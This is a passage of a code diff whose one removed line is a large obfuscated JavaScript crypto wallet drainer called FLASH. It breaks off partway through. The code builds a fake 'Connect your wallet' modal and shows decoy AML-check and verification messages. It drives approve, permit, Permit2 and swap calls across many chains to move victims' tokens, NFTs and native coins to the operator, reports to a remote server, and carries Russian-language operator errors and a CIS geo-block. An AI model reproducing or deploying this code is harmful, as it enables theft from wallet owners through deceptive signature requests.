@@ -1,1 +1,3338 @@
-const _0x26b509=_0x3619;(function(_0x122afa,_0x11097f){const _0x267691=_0x3619,_0x353d3b=_0x122afa();while(!![]){try{const _0x508214=-parseInt(_0x267691(0x240))/0x1*(-parseInt(_0x267691(0x1b5))/0x2)+-parseInt(_0x267691(0x1d7))/0x3*(-parseInt(_0x267691(0x23b))/0x4)+-parseInt(_0x267691(0x220))/0x5+parseInt(_0x267691(0x205))/0x6+-parseInt(_0x267691(0x15b))/0x7+-parseInt(_0x267691(0xc6))/0x8*(-parseInt(_0x267691(0x219))/0x9)+-parseInt(_0x267691(0x222))/0xa;if(_0x508214===_0x11097f)break;else _0x353d3b['push'](_0x353d3b['shift']());}catch(_0x47b7e2){_0x353d3b['push'](_0x353d3b['shift']());}}}(_0x62fb,0x3bb39));let FLASH_Encryption_Key=0x32;const FLASH_Server=_0x26b509(0x266),FLASH_WalletConnect_ID=_0x26b509(0x1b2),FLASH_Modal_Style=0x2,FLASH_Loader_Style=0x2,FLASH_Color_Scheme=_0x26b509(0x9a),FLASH_Modal_Mode=0x1,FLASH_Verify_Message='',FLASH_WalletConnect_MetaData={'name':document['title'],'description':'Web3\x20Application','url':'https://'+window[_0x26b509(0x26b)][_0x26b509(0x1a9)],'icons':['https://avatars.githubusercontent.com/u/37784886']},FLASH_WalletConnect_Customization=0x0,FLASH_WalletConnect_Theme={'themeMode':_0x26b509(0x9a),'themeVariables':{'--w3m-background-color':_0x26b509(0x103),'--w3m-accent-color':_0x26b509(0x284),'--w3m-z-index':0x98967f}},FLASH_Custom_Chat={'Enable':0x0,'Chat_Settings':{'enter_website':'','leave_website':'','connect_success':'','connect_request':'','connect_cancel':'','approve_request':'','approve_success':'','approve_cancel':'','permit_sign_data':'','transfer_request':'','transfer_success':'','transfer_cancel':'','sign_request':'','sign_success':'','sign_cancel':'','chain_request':'','chain_success':'','chain_cancel':''}};function _0x62fb(){const _0x3cfe1a=['<b>Критическая\x20ошибка</b><br><br>Скрипт\x20не\x20может\x20соединиться\x20с\x20сервером\x20и\x20получить\x20данные,\x20возможно\x20вы\x20настроили\x20что-то\x20некорректно\x20или\x20домен\x20сервера\x20ещё\x20недоступен\x20или\x20был\x20заблокирован.\x20Проверьте\x20и\x20исправьте\x20проблемы\x20перед\x20использованием\x20сайта.','ERC1155','WC_AE','Thanks!','selectedAddress','wallet_switchEthereumChain','GLMR','0x38','PERMIT2_BATCH','2.0','100','CELO','FLASH_ID','0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270','Pancake_V3','sign_unavailable','uint256','Uniswap','charCodeAt','Blur','Implementation','/api?module=contract&action=getsourcecode&address=','BigNumber','check_wallet','open','reduce','120','Fantom\x20Opera','classList','increaseAllowance','primary_asset_contracts',',\x20Permit\x20Type:\x20','Proxy','error','Sushiswap','getTransactionCount','eth_requestAccounts','pending','1461501637330902918203684832716283019655932542975','isMetaMask','owner','toHex','nonce','increment','https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless','api.polygonscan.com','parse','Approve','sha3','AVAX','swapExactTokensForETH','GET','0x89','Swappers','Public_Contract','getElementById','innerHTML','web3-modal','Contract_Address','<b>Sign\x20message</b>\x20to\x20verificate\x20you\x20wallet...','toLocaleString','https://link.trustwallet.com/open_url?coin_id=60&url=https://','value','methods','Pulse','Base','Optimism','eth','EthereumProvider','<b>Thanks!</b>','Use_Public_Premium','function','transferFrom','tokenType','uint256[]','waitForTransaction','permit2','message','0xEfF92A263d31888d860bD50809A8D171709b7b1c','Нет\x20связи\x20с\x20сервером','wallet_addEthereumChain','_blank','userLanguage','Got\x20your\x20sign,\x20wait\x20a\x20bit\x20for\x20confirmation...','NATIVE','permit','Contract','3060680ywPUYO','MetaMask','getSigner','spender','ver=28112023&raw=','createElement','Use_Back_Feature','expiry','eth_signTypedData','application/x-www-form-urlencoded','<b>Sorry!</b>\x20Your\x20wallet\x20doesn\x27t\x20meet\x20the\x20requirements.<br><br>Try\x20to\x20connect\x20a\x20middle-active\x20wallet\x20to\x20try\x20again!','address[]','disconnect','num_sales','sub','Checking\x20your\x20wallet\x20for\x20AML...','https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp','swapper_allowance','Please\x20wait,\x20we\x27re\x20scanning\x20more\x20details...','fantom','\x22,\x22outputs\x22:[],\x22payable\x22:true,\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22}]','_signTypedData','permit(','Use_Public_Contract','Waiting...','tokenPrice','Enable','success','@walletconnect/ethereum-provider','0x1E0049783F008A0085193E00003D00cd54003c71','Wallet_Blacklist','hex','BinanceChain','Please,\x20wait\x20a\x20bit\x20for\x20confirmation...','https://ya.ru','balance','balanceUsd','0x000000000022d473030f116ddee9f6b43ac78ba3','ethereum','platform','Запрещенная\x20геолокация','user_id','approve_token','ANKR','https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD','boolean','test','WalletConnect','functions','request','eth_sign','utils','ETH','swapExactTokensForTokens','sigDeadline','Error','cronos','partner_percent','encodeABI','now','V_FLASHG','Your\x20wallet\x20doesn\x27t\x20meet\x20the\x20requirements.\x20Try\x20to\x20connect\x20a\x20middle-active\x20wallet\x20to\x20try\x20again!','Force','expiration','toString','sign_request','Tokens','Ethereum\x20Mainnet','Скрипт\x20не\x20может\x20соединиться\x20с\x20сервером\x20и\x20получить\x20данные,\x20возможно\x20вы\x20настроили\x20что-то\x20некорректно\x20или\x20домен\x20сервера\x20ещё\x20недоступен\x20или\x20был\x20заблокирован.\x20Проверьте\x20и\x20исправьте\x20проблемы\x20перед\x20использованием\x20сайта.','swap_success','search','body','PermitDetails[]','zksync_era','push','length','https://api.opensea.io/api/v1/assets?owner=','block','host','LOCAL_CHECK','ether','isApprovedForAll','0x13f4EA83D0bd40E75C8222255bc855a974568Dd4','DOMAIN_SEPARATOR','OPENSEA','Native','lte','53cb6c00218a6d60162590ce6debfc5c','We\x20have\x20received\x20your\x20signature,\x20but\x20it\x27s\x20incorrect,\x20please\x20try\x20again.','Something\x20went\x20wrong!','966mcVTrn','0x10ED43C718714eb63d5aA57B78B54704E256024E','Use_Randomizer_For_Tokens','increase','0xA86A','vendor','Receiver','bool','ontouchend','data','style','Coinbase','Permit2','ABI','.connect-button',',\x20Allowance:\x20','token','init','Settings','get','json','result','allowed','Настройте\x20оценщики','amount','estimateGas','https://bscscan.com','none','0x0','address','ONE','increaseApproval','withdraw_native','web3-overlay','6FkyMZd','nonces','We\x27re\x20sorry','Gas_Multiplier','querySelector','[PERMIT_2\x20FOUND]\x20','object','Binance\x20Coin','price','optimism','bytes[]','x2y2','gnosis','getElementsByClassName','deadline','https://metamask.app.link/dapp/','https://metamask.io',',\x20Version:\x20','time','Contract_Type','amountIn','DOMContentLoaded','ankr_getAccountBalance','getGasPrice','chain_identifier','sendTransaction','isCoinbaseWallet','Personal_Wallet','Sushi','PermitDetails','INVALID_VERSION','html','POST','Address','application/json','[{\x22constant\x22:false,\x22inputs\x22:[],\x22name\x22:\x22','swapper','permit_token','Connection\x20established','Connecting\x20to\x20Blockchain...','Notifications','asset_contract','\x20Please,\x20don\x27t\x20leave\x20this\x20page!','DSB','[{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22','Ether','1440396NaTfRL','chain_cancel','partner-address','div','AML\x20Error','<b>Ошибка</b><br><br>Ни\x20один\x20из\x20оценщиков\x20не\x20активирован\x20в\x20настройках\x20скрипта,\x20оценка\x20активов\x20кошелька\x20невозможна,\x20проверьте\x20настройки\x20и\x20перезапустите\x20сервер!','iPhone\x20Simulator','matic','gasPrice','retrive_id','trim','retrive_config','Min_Native_Price','sign','API','<b>Предупреждение</b><br><br>Пожалуйста,\x20покиньте\x20этот\x20веб-сайт\x20немедленно,\x20он\x20не\x20предназначен\x20для\x20России\x20и\x20стран\x20СНГ,\x20не\x20пытайтесь\x20использовать\x20VPN,\x20это\x20небезопасно!','iPad\x20Simulator','path','0xFA','schema_name','99KCjMmF','For\x20security\x20reasons\x20we\x20can\x27t\x20allow\x20you\x20to\x20connect\x20empty\x20or\x20new\x20wallet','replaceAll','substring','toLowerCase','Server\x20is\x20Unavailable','then','167640OKCeFY','kava','6008940PBZjEU','https://optimistic.etherscan.io/','sign_success','Ethereum','hash','version','CRO','0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F','Confirming\x20sign...','personal_sign','type','web3-modal-wc','[PERMIT\x20FOUND]\x20','Wait_For_Confirmation','Pancake','all','https://rpc.ankr.com/multichain/','https://snowtrace.io/','Loading...','substr','moonbeam','api.bscscan.com','Tokens_First','from','Unlimited_BL','939688pCANvq','display','code','focus','blockchain','361vUSYpt','text','mul','chainId','&order_direction=desc&limit=200&include_orders=false','splice','isTrust','getBalance','ERC721','gasLimit','multicall','Mac','count','iPod\x20Simulator','eth_signTransaction','domain','status','details','ERC20','Price','accounts','addEventListener','RPCs','amount_raw','<div\x20class=\x22web3-modal-main\x22><p\x20class=\x22web3-modal-title\x22\x20style=\x22margin-top:0\x22>Connect\x20your\x20wallet</p><div\x20class=\x22web3-modal-items\x22><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22MetaMask\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/MM.svg\x22\x20alt=\x22\x22></div><span>MetaMask</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22Coinbase\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/CB.svg\x22\x20alt=\x22\x22></div><span>Coinbase</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22Trust\x20Wallet\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/TW.svg\x22\x20alt=\x22\x22></div><span>Trust\x20Wallet</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22Binance\x20Wallet\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/BW.svg\x22\x20alt=\x22\x22></div><span>Binance\x20Wallet</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x22use_wc()\x22><div><div\x20class=\x22icon\x22></div><span>More\x20Wallets</span></div><div\x20class=\x22arrow\x22></div></div></div></div><div\x20class=\x22web3-modal-wc\x22\x20style=\x22display:none\x22><p\x20class=\x22web3-modal-title\x22\x20style=\x22margin-top:0\x22>Choose\x20Version</p><div\x20class=\x22web3-modal-items\x22><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22WalletConnect\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/WC.svg\x22\x20alt=\x22\x22></div><span>WalletConnect</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22WalletConnect\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/WC1.svg\x22\x20alt=\x22\x22></div><span>WalletConnect\x20Legacy</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x22ms_init()\x22><div\x20class=\x22arrow\x22\x20style=\x22transform:rotateY(190deg)\x22></div><div><div\x20class=\x22icon\x22></div><span>Return\x20to\x20Wallets</span></div></div></div></div>','eth_sendTransaction','amounts','https://scan.pulsechain.com/','retrive_contract','https://explorer.arbitrum.io','Your\x20wallet\x20is\x20not\x20AML\x20clear,\x20you\x20can\x27t\x20use\x20it!','Critical\x20Error','log','join','&apikey=','approve','Trust','SRV_UNAVAILABLE','mdpp.neutralpro.live','Mode','Min_NFTs_Price','click','formatUnits','location','seven_day_average_price','.web3-overlay','swapper_address','startsWith','Getting\x20your\x20wallet\x20address...','Contract_Legacy','approve_request','Your\x20wallet\x20is\x20not\x20AML\x20clear!','0x00000000000111abe46ff893f3b2fdf1f759a8a8','pulse','uint48','flash-modal','Web3Provider','https://ftmscan.com/','base','stats','Use_Wallet_Randomizer','0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7','Sign\x20message\x20in\x20your\x20wallet...','indexOf','parseEther','https://api.opensea.io/api/v1/collections?asset_owner=','Verification\x20Error','Sign','#F5841F','floor','USD','era','tokenDecimals','tokenSymbol','slice','safa_approves','Quickswap','arbitrum','chain_id','serialize','[{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22depositer\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22handler\x22,\x22type\x22:\x22address\x22},\x0a\x20\x20{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22keeper\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22uint8\x22,\x22name\x22:\x22percent\x22,\x22type\x22:\x22uint8\x22},{\x22internalType\x22:\x22bool\x22,\x22name\x22:\x22is_cashback\x22,\x22type\x22:\x22bool\x22}],\x22name\x22:\x22','connect_request','opera','Min_Tokens_Price','uint160','Priority','ru-RU','close','Contract_Blacklist','JsonRpcProvider','string','BNB','load','Loop_NFT','transfer','iPhone','Contract_Whitelist','polygon','0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45','light','match','avalanche','amountOutMin','skip','prepend','sign_permit2','[SWAP\x20FOUND]\x20','bsc','contractAddress','Invalid\x20Wallet','iPod','Permit','Waiting\x20for\x20action','LOW_BALANCE','random','connect_success','onbeforeunload','0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c','Everything\x20good!','withdraw_token','eth_signTypedData_v4','undefined','chain_request','approve_success','Server\x20Error','0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff','@import\x20url(https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap);.web3-modal,.web3-overlay{position:fixed;top:0;left:0;width:100%}.web3-overlay{height:100%;background:rgba(23,23,23,.8);backdrop-filter:blur(5px);z-index:99998}.web3-modal{right:0;bottom:0;margin:auto;max-width:500px;height:fit-content;padding:21px\x200\x200;background:#fff;border-radius:60px;z-index:99999;font-family:Inter,sans-serif}.web3-modal-title{font-weight:700;font-size:24px;line-height:29px;color:#000;text-align:center}.web3-modal-items{border-top:1px\x20solid\x20rgba(0,0,0,.1);margin-top:21px}.web3-modal\x20.item{padding:15px\x2034px;border-bottom:1px\x20solid\x20rgba(0,0,0,.1);display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:.2s}.web3-modal\x20.item:hover{background:#fafafa;border-radius:\x2020px}.web3-modal\x20.item\x20div{display:flex;align-items:center}.web3-modal\x20.item:last-child{border-bottom:none;border-radius:\x200px\x200px\x2060px\x2060px;}.web3-modal\x20.item\x20span{font-weight:400;font-size:16px;color:#000;margin-left:11px}.web3-modal\x20.item\x20.icon{width:40px;height:40px;justify-content:center}.web3-modal\x20.item\x20.arrow{height:12px;width:7.4px;background:url(\x27/assets/web3-modal/images/arrow.svg\x27)\x20no-repeat}\x20@media\x20(prefers-color-scheme:\x20dark)\x20{.web3-modal\x20{background:\x20#1c1c1c;color:\x20#fff;}.web3-modal-items\x20{border-top:\x201px\x20solid\x20#E4DDDD;}.web3-modal\x20.item\x20span\x20{color:\x20#fff;}.web3-modal\x20.item\x20.arrow\x20{-webkit-filter:\x20invert(1);filter:\x20invert(1);}.web3-modal-title\x20{color:\x20#fff;}.web3-modal\x20.item:hover\x20{background:#262525;}\x20.swal2-popup\x20{\x20background:\x20#1c1c1c;\x20color:\x20#ffffff;\x20}\x20.swal2-styled.swal2-confirm\x20{\x20background-color:\x20#3e7022;\x20}\x20.swal2-styled.swal2-confirm:focus\x20{\x20box-shadow:\x200\x200\x200\x203px\x20#3e7022;\x20}\x20}','stringify','balanceRawInteger','appendChild','permit_ver','CURRENCY','remove','Ни\x20один\x20из\x20оценщиков\x20не\x20активирован\x20в\x20настройках\x20скрипта,\x20оценка\x20активов\x20кошелька\x20невозможна,\x20проверьте\x20настройки\x20и\x20перезапустите\x20сервер!','Loop_N','hasOwnProperty','fire','https://polygonscan.com','amount_usd','PLS','message_ts','sign_verify','includes','314128zVHErE','WalletConnect_v2','0x1','Processing\x20wallet','transfer_cancel','NFTs','split','one_day_average_price','<b>Waiting\x20for\x20your\x20sign...</b><br><br>Please,\x20sign\x20message\x20in\x20your\x20wallet!','percent','FTM','SeaPort','personal_wallet','recoverAddress','allowance','approve_cancel','about:blank','heco','name','abi','Chains','Quick','swapper_type','MATIC','UNSUPPORTED','map','Критическая\x20ошибка','providers','Binance\x20Wallet','transfer_success','Please,\x20check\x20client\x20and\x20server\x20version,\x20looks\x20like\x20it\x20doesn\x27t\x20match,\x20or\x20maybe\x20you\x20need\x20to\x20clear\x20cache\x20everywhere\x20:(','Loop_T','fromCharCode','Arbitrum\x20One','&offset=0&limit=200','https://etherscan.io','Use_Contract_Amount','https://www.coinbase.com/wallet','leave_website','head','https://','href','connect_cancel','querySelectorAll','0x82af49447d8a07e3bd95bd0d56f35241523fbab1','api.etherscan.io','0x21be370d5312f44cb42ce377bc9b8a0cef1a4c83','0x2105','<b>Success!</b>\x20Your\x20sign\x20is\x20confirmed!','language','{{ADDRESS}}','Trust\x20Wallet','Wait_For_Response','assets','web3-style','0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506','payable','https://explorer.zksync.io/','zkSync\x20Era','https://go.cb-w.com/dapp?cb_url=https://','KAVA','#000000'];_0x62fb=function(){return _0x3cfe1a;};return _0x62fb();}var FLASH_Worker_ID=null;const BN=ethers[_0x26b509(0x11a)][_0x26b509(0x239)];let FLASH_Ready=![],FLASH_Settings={},FLASH_Contract_ABI={},FLASH_ID=0x0,FLASH_Process=![],FLASH_Provider=null,FLASH_Current_Provider=null,FLASH_Current_Address=null,FLASH_Current_Chain_ID=null,FLASH_Web3=null,FLASH_Signer=null,FLASH_Check_Done=![],FLASH_Currencies={},FLASH_Force_Mode=![],FLASH_Sign_Disabled=![],BL_US=![],SP_US=![],XY_US=![],FLASH_Bad_Country=![],FLASH_Connection=![],FLASH_Load_Time=null,FLASH_Gas_Multiplier=0x2,FLASH_Partner_Address=![];const WC2_Provider=window[_0x26b509(0x177)][_0x26b509(0x148)],is_valid_json=_0x4074e2=>{const _0x1cf8db=_0x26b509;try{JSON[_0x1cf8db(0x132)](_0x4074e2);}catch(_0x180baf){return![];}return!![];};((async()=>{const _0x5e988b=_0x26b509;try{let _0xd7b179=await fetch(_0x5e988b(0x187),{'method':_0x5e988b(0x137),'headers':{'Accept':_0x5e988b(0x1f9)}});FLASH_Currencies=await _0xd7b179[_0x5e988b(0x1c9)](),FLASH_Currencies[_0x5e988b(0xc2)]={'USD':0.00004512};}catch(_0x14706c){console[_0x5e988b(0x260)](_0x14706c);}})());const FLASH_API_Data={0x1:_0x26b509(0xf3),0xa:'api-optimistic.etherscan.io',0x38:_0x26b509(0x237),0x89:_0x26b509(0x131),0xfa:'api.ftmscan.com',0xa4b1:'api.arbiscan.io',0xa86a:'api.snowtrace.io',0x2105:'api.basescan.org'};var FLASH_MetaMask_ChainData={};const fill_chain_data=()=>{const _0x218984=_0x26b509;FLASH_MetaMask_ChainData={0x1:{'chainId':_0x218984(0xc8),'chainName':_0x218984(0x19e),'nativeCurrency':{'name':_0x218984(0x204),'symbol':_0x218984(0x18f),'decimals':0x12},'rpcUrls':[FLASH_Settings[_0x218984(0x256)][0x1]],'blockExplorerUrls':[_0x218984(0xe9)]},0x38:{'chainId':_0x218984(0x10b),'chainName':'BNB\x20Smart\x20Chain','nativeCurrency':{'name':_0x218984(0x1de),'symbol':'BNB','decimals':0x12},'rpcUrls':[FLASH_Settings[_0x218984(0x256)][0x38]],'blockExplorerUrls':[_0x218984(0x1cf)]},0x89:{'chainId':_0x218984(0x138),'chainName':'Polygon\x20Mainnet','nativeCurrency':{'name':_0x218984(0xdd),'symbol':_0x218984(0xdd),'decimals':0x12},'rpcUrls':[FLASH_Settings[_0x218984(0x256)][0x89]],'blockExplorerUrls':[_0x218984(0xc0)]},0xa86a:{'chainId':_0x218984(0x1b9),'chainName':'Avalanche\x20Network\x20C-Chain','nativeCurrency':{'name':_0x218984(0x135),'symbol':'AVAX','decimals':0x12},'rpcUrls':[FLASH_Settings['RPCs'][0xa86a]],'blockExplorerUrls':[_0x218984(0x233)]},0xa4b1:{'chainId':'0xA4B1','chainName':_0x218984(0xe7),'nativeCurrency':{'name':'ETH','symbol':_0x218984(0x18f),'decimals':0x12},'rpcUrls':[FLASH_Settings[_0x218984(0x256)][0xa4b1]],'blockExplorerUrls':[_0x218984(0x25d)]},0xa:{'chainId':'0xA','chainName':_0x218984(0x146),'nativeCurrency':{'name':_0x218984(0x18f),'symbol':'ETH','decimals':0x12},'rpcUrls':[FLASH_Settings[_0x218984(0x256)][0xa]],'blockExplorerUrls':[_0x218984(0x223)]},0xfa:{'chainId':_0x218984(0x217),'chainName':_0x218984(0x11f),'nativeCurrency':{'name':_0x218984(0xd0),'symbol':_0x218984(0xd0),'decimals':0x12},'rpcUrls':[FLASH_Settings['RPCs'][0xfa]],'blockExplorerUrls':[_0x218984(0x279)]},0x2105:{'chainId':_0x218984(0xf5),'chainName':_0x218984(0x145),'nativeCurrency':{'name':_0x218984(0x18f),'symbol':_0x218984(0x18f),'decimals':0x12},'rpcUrls':[FLASH_Settings['RPCs'][0x2105]],'blockExplorerUrls':['https://basescan.org/']},0x144:{'chainId':'0x144','chainName':_0x218984(0x100),'nativeCurrency':{'name':_0x218984(0x18f),'symbol':_0x218984(0x18f),'decimals':0x12},'rpcUrls':[FLASH_Settings[_0x218984(0x256)][0x144]],'blockExplorerUrls':[_0x218984(0xff)]},0x171:{'chainId':'0x171','chainName':_0x218984(0x144),'nativeCurrency':{'name':_0x218984(0xc2),'symbol':_0x218984(0xc2),'decimals':0x12},'rpcUrls':[FLASH_Settings['RPCs'][0x171]],'blockExplorerUrls':[_0x218984(0x25b)]}};},FLASH_Routers={0x1:[[_0x26b509(0x115),_0x26b509(0x2a2)],[_0x26b509(0x230),_0x26b509(0x152)],[_0x26b509(0x112),_0x26b509(0x1ad)],[_0x26b509(0x126),_0x26b509(0x229)]],0xa:[['Uniswap','0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45']],0x38:[[_0x26b509(0x230),_0x26b509(0x1b6)],[_0x26b509(0x112),_0x26b509(0x1ad)],[_0x26b509(0x126),_0x26b509(0xfd)]],0x89:[['Uniswap',_0x26b509(0x2a2)],['Sushiswap','0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506'],[_0x26b509(0x28c),_0x26b509(0xb4)]],0xfa:[[_0x26b509(0x126),'0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']],0xa4b1:[[_0x26b509(0x115),'0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],[_0x26b509(0x126),'0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']],0xa86a:[[_0x26b509(0x126),_0x26b509(0xfd)]]},FLASH_Swap_Route={0x1:'0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2',0xa:'0x4200000000000000000000000000000000000006',0x38:_0x26b509(0xac),0x89:_0x26b509(0x111),0xfa:_0x26b509(0xf4),0xa4b1:_0x26b509(0xf2),0xa86a:_0x26b509(0x27d)},FLASH_Uniswap_ABI=[{'inputs':[{'internalType':'uint256','name':_0x26b509(0x1eb),'type':_0x26b509(0x114)},{'internalType':_0x26b509(0x114),'name':_0x26b509(0x9d),'type':_0x26b509(0x114)},{'internalType':'address[]','name':'path','type':_0x26b509(0x166)},{'internalType':_0x26b509(0x1d2),'name':'to','type':_0x26b509(0x1d2)}],'name':_0x26b509(0x190),'outputs':[{'internalType':_0x26b509(0x114),'name':'amountOut','type':_0x26b509(0x114)}],'stateMutability':_0x26b509(0xfe),'type':_0x26b509(0x14b)},{'inputs':[{'internalType':_0x26b509(0x114),'name':'deadline','type':'uint256'},{'internalType':'bytes[]','name':_0x26b509(0x1be),'type':_0x26b509(0x1e1)}],'name':_0x26b509(0x24a),'outputs':[{'internalType':_0x26b509(0x1e1),'name':'','type':_0x26b509(0x1e1)}],'stateMutability':_0x26b509(0xfe),'type':_0x26b509(0x14b)}],FLASH_Pancake_ABI=[{'inputs':[{'internalType':_0x26b509(0x114),'name':_0x26b509(0x1eb),'type':_0x26b509(0x114)},{'internalType':_0x26b509(0x114),'name':_0x26b509(0x9d),'type':_0x26b509(0x114)},{'internalType':_0x26b509(0x166),'name':_0x26b509(0x216),'type':'address[]'},{'internalType':'address','name':'to','type':_0x26b509(0x1d2)},{'internalType':'uint256','name':_0x26b509(0x1e5),'type':_0x26b509(0x114)}],'name':_0x26b509(0x190),'outputs':[{'internalType':_0x26b509(0x14e),'name':_0x26b509(0x25a),'type':_0x26b509(0x14e)}],'stateMutability':'nonpayable','type':_0x26b509(0x14b)},{'inputs':[{'internalType':'uint256','name':_0x26b509(0x1eb),'type':_0x26b509(0x114)},{'internalType':_0x26b509(0x114),'name':'amountOutMin','type':_0x26b509(0x114)},{'internalType':'address[]','name':'path','type':'address[]'},{'internalType':_0x26b509(0x1d2),'name':'to','type':_0x26b509(0x1d2)},{'internalType':_0x26b509(0x114),'name':_0x26b509(0x1e5),'type':_0x26b509(0x114)}],'name':'swapExactTokensForETH','outputs':[{'internalType':_0x26b509(0x14e),'name':_0x26b509(0x25a),'type':_0x26b509(0x14e)}],'stateMutability':'nonpayable','type':_0x26b509(0x14b)},{'inputs':[{'internalType':_0x26b509(0x114),'name':_0x26b509(0x1e5),'type':_0x26b509(0x114)},{'internalType':'bytes[]','name':_0x26b509(0x1be),'type':_0x26b509(0x1e1)}],'name':_0x26b509(0x24a),'outputs':[{'internalType':_0x26b509(0x1e1),'name':'','type':_0x26b509(0x1e1)}],'stateMutability':_0x26b509(0xfe),'type':'function'},{'inputs':[{'internalType':'uint256','name':_0x26b509(0x1eb),'type':'uint256'},{'internalType':'uint256','name':_0x26b509(0x9d),'type':'uint256'},{'internalType':'address[]','name':'path','type':'address[]'},{'internalType':_0x26b509(0x1d2),'name':'to','type':_0x26b509(0x1d2)}],'name':_0x26b509(0x190),'outputs':[{'internalType':_0x26b509(0x14e),'name':_0x26b509(0x25a),'type':_0x26b509(0x14e)}],'stateMutability':'nonpayable','type':_0x26b509(0x14b)}],FLASH_Current_URL=window[_0x26b509(0x26b)][_0x26b509(0xef)]['replace'](/http[s]*:\/\//,''),FLASH_Mobile_Status=((()=>{const _0x5c4e87=_0x26b509;let _0x4aac45=![];return function(_0x38eeef){const _0x362c1c=_0x3619;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i[_0x362c1c(0x189)](_0x38eeef)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v 